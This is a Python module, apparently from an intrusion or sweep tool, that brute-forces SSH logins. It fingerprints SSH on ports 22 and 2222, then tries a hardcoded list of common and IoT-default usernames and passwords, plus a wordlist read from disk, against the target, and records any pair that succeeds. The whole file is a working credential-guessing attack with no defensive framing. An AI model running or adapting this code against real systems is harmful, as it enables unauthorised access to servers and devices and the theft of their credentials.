"""SSH-Brute mit kleiner Top-Liste."""
from __future__ import annotations
import socket
import time

try:
    import paramiko
except Exception:
    paramiko = None

from .sshvec import SSHChannel

USERS = ["root", "admin", "ubuntu", "pi", "user"]
PWS = ["root", "admin", "toor", "123456", "password", "12345678", "1234", "12345",
       "raspberry", "ubuntu", "admin123", "P@ssw0rd", "Passw0rd", "geheim", "letmein",
       "qwerty", "abc123", "1q2w3e4r", "changeme", "default", "system", "cisco",
       "support", "test", "guest", "oracle", "postgres", "mysql", "tecom", "xc3511",
       "vizxv", "hi3518", "anko", "dreambox", "service", "manager", "supervisor",
       "operator", "security", "monitor", "backup", "ftpuser"]


def detect(t) -> bool:
    if paramiko is None or t.port not in (22, 2222):
        return False
    try:
        s = socket.create_connection((t.host, t.port), timeout=4)
        s.settimeout(3)
        b = s.recv(40)
        s.close()
        return b.startswith(b"SSH-")
    except Exception:
        return False


LIST = "/opt/dwsweep/pw/top.txt"


def _pws():
    seen = set(PWS)
    out = list(PWS)
    try:
        with open(LIST, errors="ignore") as f:
            for i, l in enumerate(f):
                if i > 4000:
                    break
                p = l.strip()
                if p and p not in seen:
                    seen.add(p)
                    out.append(p)
    except FileNotFoundError:
        pass
    return out


def open_(t, audit):
    budget = time.time() + 120
    pws = _pws()
    for u in USERS:
        for p in pws:
            if time.time() > budget:
                return None
            ch = SSHChannel(t.host, t.port, u, p)
            try:
                if ch.proof(t.url, "BRUTE"):
                    audit.write("cred", "ssh-brute", t.url, user=u, secret=p)
                    return ch
            except Exception:
                continue
    return None
